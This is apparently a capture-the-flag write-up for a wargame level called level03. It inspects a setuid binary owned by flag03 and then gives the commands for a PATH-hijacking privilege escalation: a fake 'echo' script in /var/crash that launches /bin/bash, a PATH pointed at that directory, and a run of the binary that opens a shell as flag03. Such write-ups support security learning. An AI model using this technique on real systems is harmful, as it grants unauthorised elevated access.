Check the permissions of the file:

```
-rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03
```

The binary is owned by flag03.

Check symbols using nm:

```
getegid@@GLIBC_2.0
geteuid@@GLIBC_2.0
setresgid@@GLIBC_2.0
setresuid@@GLIBC_2.0
system@@GLIBC_2.0
```

The binary don't call write but call system then we can guess it use **echo**.

Previously we find a directory where we can write files in **/var/crash**. We can create a fake echo and update the path to force system to call our fake echo:

```
$ echo "/bin/bash" > /var/crash/echo
$ chmod +x /var/crash/echo
$ export PATH="/var/crash"
$ ./level03
```

Then we have a shell launched by flag03.
